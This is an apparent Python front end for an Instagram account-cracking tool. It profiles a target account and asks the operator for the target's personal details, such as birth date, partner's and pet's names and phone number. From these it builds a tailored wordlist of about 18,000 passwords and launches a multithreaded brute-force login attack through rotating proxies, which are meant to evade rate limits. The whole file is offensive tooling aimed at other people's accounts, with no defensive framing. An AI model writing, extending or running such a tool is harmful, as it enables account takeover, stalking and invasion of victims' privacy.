#!/usr/bin/env python3
import sys
import json
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.banner import (
    show_banner, show_menu, show_info_panel,
    show_password_stats, R, G, Y, C, M, W, RE, console
)
from core.info_gather import InstagramInfoGatherer
from core.password_engine import PasswordEngine
from core.brute_attacker import BruteAttacker
from core.proxy_rotator import ProxyRotator

def collect_personal_info(username):
    console.print(f"\n{M}[ PERSONAL INFORMATION COLLECTION ]{RE}")
    console.print(f"{Y}Enter as much information as you know about @{username}{RE}")
    console.print(f"{Y}More information = better password generation{RE}\n")

    personal_info = {
        "real_name": "",
        "birth_date": "",
        "birth_day": "",
        "birth_month": "",
        "birth_year": "",
        "girlfriend_name": "",
        "pet_name": "",
        "favorite_thing": "",
        "nickname": "",
        "phone_number": "",
        "additional_words": [],
    }

    personal_info["real_name"] = input(f"{C}[?] Real full name: {W}").strip()
    personal_info["birth_date"] = input(f"{C}[?] Birth date (DD/MM/YYYY): {W}").strip()

    if not personal_info["birth_date"]:
        personal_info["birth_day"] = input(f"{C}[?] Birth day (DD): {W}").strip()
        personal_info["birth_month"] = input(f"{C}[?] Birth month (MM): {W}").strip()
        personal_info["birth_year"] = input(f"{C}[?] Birth year (YYYY): {W}").strip()

    personal_info["girlfriend_name"] = input(f"{C}[?] Girlfriend/Boyfriend name: {W}").strip()
    personal_info["pet_name"] = input(f"{C}[?] Pet name: {W}").strip()
    personal_info["favorite_thing"] = input(f"{C}[?] Favorite thing (sport/team/hobby): {W}").strip()
    personal_info["nickname"] = input(f"{C}[?] Nickname: {W}").strip()
    personal_info["phone_number"] = input(f"{C}[?] Phone number (if known): {W}").strip()

    print(f"\n{Y}[*] Additional keywords (one per line, empty to finish):{RE}")
    while True:
        word = input(f"{C}    > {W}").strip()
        if not word:
            break
        personal_info["additional_words"].append(word)
    return personal_info

def mode_info_gathering():
    show_banner()
    username = input(f"\n{C}[?] Enter Instagram username: {W}@").strip()
    if not username:
        console.print(f"{R}[!] Username required!{RE}")
        return

    gatherer = InstagramInfoGatherer()
    data = gatherer.extract_profile_data(username)
    if data:
        show_info_panel(username, data)
        output_dir = os.path.join("output", "profiles")
        os.makedirs(output_dir, exist_ok=True)
        filepath = os.path.join(output_dir, f"{username}_profile.json")
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        console.print(f"{G}[+] Profile saved to: {filepath}{RE}")
    else:
        console.print(f"{R}[!] Could not retrieve profile information{RE}")

def mode_password_generation():
    show_banner()
    username = input(f"\n{C}[?] Enter target username: {W}@").strip()
    if not username:
        console.print(f"{R}[!] Username required!{RE}")
        return

    gatherer = InstagramInfoGatherer()
    profile_data = gatherer.extract_profile_data(username)
    if profile_data:
        show_info_panel(username, profile_data)

    personal_info = collect_personal_info(username)
    engine = PasswordEngine(
        target_data=profile_data or {
            "username": username,
            "extracted_names": [],
            "extracted_dates": [],
            "extracted_keywords": [],
        },
        personal_info=personal_info,
    )
    passwords = engine.generate_passwords(target_count=18000)
    show_password_stats(passwords)

    os.makedirs(os.path.join("output", "wordlists"), exist_ok=True)
    filepath = os.path.join("output", "wordlists", f"{username}_passwords.txt")
    with open(filepath, "w", encoding="utf-8") as f:
        for pwd in passwords:
            f.write(pwd + "\n")
    console.print(f"{G}[+] {len(passwords):,} passwords saved to: {filepath}{RE}")

def mode_full_attack():
    show_banner()
    username = input(f"\n{C}[?] Enter target Instagram username: {W}@").strip()
    if not username:
        console.print(f"{R}[!] Username required!{RE}")
        return

    console.print(f"\n{Y}[STEP 1/4] Gathering target intelligence...{RE}")
    gatherer = InstagramInfoGatherer()
    profile_data = gatherer.extract_profile_data(username)
    if profile_data:
        show_info_panel(username, profile_data)
    else:
        profile_data = {
            "username": username,
            "extracted_names": [],
            "extracted_dates": [],
            "extracted_keywords": [],
            "full_name": "",
            "biography": "",
        }
        console.print(f"{Y}[!] Limited profile data - using username only{RE}")

    console.print(f"\n{Y}[STEP 2/4] Collecting personal information...{RE}")
    personal_info = collect_personal_info(username)

    console.print(f"\n{Y}[STEP 3/4] Generating password list...{RE}")
    engine = PasswordEngine(target_data=profile_data, personal_info=personal_info)
    passwords = engine.generate_passwords(target_count=18000)
    show_password_stats(passwords)
    if not passwords:
        console.print(f"{R}[!] No passwords generated!{RE}")
        return

    console.print(f"\n{Y}[STEP 4/4] Starting brute force attack...{RE}")
    print(f"\n{R}[WARNING] This will test {len(passwords):,} passwords{RE}")
    confirm = input(f"\n{C}[?] Continue? (yes/no): {W}").strip().lower()
    if confirm not in ("yes", "y"):
        console.print(f"{Y}[!] Attack cancelled{RE}")
        return

    try:
        threads = int(input(f"{C}[?] Threads (1-5, recommended 2-3): {W}").strip() or "2")
        threads = max(1, min(5, threads))
    except ValueError:
        threads = 2

    attacker = BruteAttacker(username, passwords, ProxyRotator())
    found_password = attacker.start_attack(threads=threads)
    if found_password:
        console.print(f"\n{G}{'=' * 60}{RE}")
        console.print(f"{G}[SUCCESS] Password found!{RE}")
        console.print(f"{G}Username: {username}{RE}")
        console.print(f"{G}Password: {found_password}{RE}")
        console.print(f"{G}{'=' * 60}{RE}")
    else:
        console.print(f"\n{Y}[!] Password not found in generated list{RE}")

def mode_brute_force_only():
    show_banner()
    username = input(f"\n{C}[?] Enter target Instagram username: {W}@").strip()
    wordlist_path = input(f"{C}[?] Path to wordlist file: {W}").strip()
    if not username or not wordlist_path:
        console.print(f"{R}[!] Username and wordlist required!{RE}")
        return
    if not os.path.exists(wordlist_path):
        console.print(f"{R}[!] Wordlist file not found!{RE}")
        return

    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]
    console.print(f"{G}[+] Loaded {len(passwords):,} passwords{RE}")

    confirm = input(f"\n{C}[?] Start attack? (yes/no): {W}").strip().lower()
    if confirm not in ("yes", "y"):
        return

    try:
        threads = int(input(f"{C}[?] Threads (1-5): {W}").strip() or "2")
        threads = max(1, min(5, threads))
    except ValueError:
        threads = 2

    BruteAttacker(username, passwords, ProxyRotator()).start_attack(threads=threads)

def mode_proxy_config():
    show_banner()
    proxy_rotator = ProxyRotator()
    while True:
        console.print(f"\n{M}[ PROXY CONFIGURATION ]{RE}")
        console.print(f"{C}[1] View loaded proxies ({len(proxy_rotator.proxies)}){RE}")
        console.print(f"{C}[2] Add proxy{RE}")
        console.print(f"{C}[3] Remove proxy{RE}")
        console.print(f"{C}[4] Import proxy list from file{RE}")
        console.print(f"{C}[0] Back to main menu{RE}")
        choice = input(f"\n{Y}[?] Select: {W}").strip()

        if choice == "1":
            if proxy_rotator.proxies:
                for i, p in enumerate(proxy_rotator.proxies, 1):
                    print(f"    {C}{i}.{W} {p}")
            else:
                print(f"    {Y}No proxies configured{RE}")
        elif choice == "2":
            proxy = input(f"{C}[?] Enter proxy (ip:port or ip:port:user:pass): {W}").strip()
            if proxy_rotator.add_proxy(proxy):
                console.print(f"{G}[+] Proxy added{RE}")
            else:
                console.print(f"{Y}[!] Proxy already exists or empty{RE}")
        elif choice == "3":
            idx = input(f"{C}[?] Enter proxy number to remove: {W}").strip()
            try:
                idx = int(idx) - 1
                if 0 <= idx < len(proxy_rotator.proxies):
                    proxy_rotator.remove_proxy(proxy_rotator.proxies[idx])
                    console.print(f"{G}[+] Proxy removed{RE}")
                else:
                    console.print(f"{R}[!] Invalid index{RE}")
            except ValueError:
                console.print(f"{R}[!] Invalid input{RE}")
        elif choice == "4":
            filepath = input(f"{C}[?] Path to proxy list file: {W}").strip()
            if os.path.exists(filepath):
                with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#"):
                            proxy_rotator.add_proxy(line)
                console.print(f"{G}[+] Proxies imported{RE}")
            else:
                console.print(f"{R}[!] File not found{RE}")
        elif choice == "0":
            break

def mode_view_results():
    show_banner()
    results_dir = os.path.join("output", "results")
    if not os.path.exists(results_dir):
        console.print(f"{Y}[!] No results directory{RE}")
        return
    files = [f for f in os.listdir(results_dir) if f.endswith(".json")]
    if not files:
        console.print(f"{Y}[!] No results found{RE}")
        return
    console.print(f"\n{G}[ RESULTS ]{RE}")
    for fname in files:
        filepath = os.path.join(results_dir, fname)
        with open(filepath, "r", encoding="utf-8") as rf:
            try:
                data = json.load(rf)
                console.print(f"\n{C}File: {fname}{RE}")
                console.print(f"  Found: {data.get('found', False)}")
                console.print(f"  Password: {data.get('correct_password', 'N/A')}")
                console.print(f"  Attempts: {data.get('attempts', 0):,}")
            except Exception:
                console.print(f"  {Y}File: {fname}{RE}")

def mode_settings():
    show_banner()
    from core import config
    console.print(f"\n{M}[ SETTINGS & CONFIGURATION ]{RE}")
    console.print(f"{C}Target Password Count:{W} {config.TARGET_PASSWORD_COUNT}{RE}")
    console.print(f"{C}Min Delay:{W} {config.MIN_DELAY}s{RE}")
    console.print(f"{C}Max Delay:{W} {config.MAX_DELAY}s{RE}")
    console.print(f"{C}Max Attempts per IP:{W} {config.MAX_ATTEMPTS_PER_IP}{RE}")
    console.print(f"{C}Cooldown Period:{W} {config.COOLDOWN_PERIOD}s{RE}")
    print(f"\n{Y}[*] Edit core/config.py to modify these settings{RE}")

def main():
    try:
        while True:
            show_banner()
            show_menu()
            choice = input().strip()
            if choice == "1":
                mode_info_gathering()
            elif choice == "2":
                mode_password_generation()
            elif choice == "3":
                mode_full_attack()
            elif choice == "4":
                mode_brute_force_only()
            elif choice == "5":
                mode_proxy_config()
            elif choice == "6":
                mode_view_results()
            elif choice == "7":
                mode_settings()
            elif choice == "0":
                console.print(f"\n{G}[+] Goodbye!{RE}\n")
                sys.exit(0)
            else:
                console.print(f"{R}[!] Invalid option!{RE}")
            if choice in ("1", "2", "3", "4", "6", "7"):
                input(f"\n{Y}[*] Press Enter to continue...{RE}")
    except KeyboardInterrupt:
        console.print(f"\n\n{Y}[!] Interrupted by user{RE}")
        console.print(f"{G}[+] Goodbye!{RE}\n")
        sys.exit(0)

if __name__ == "__main__":
    main()
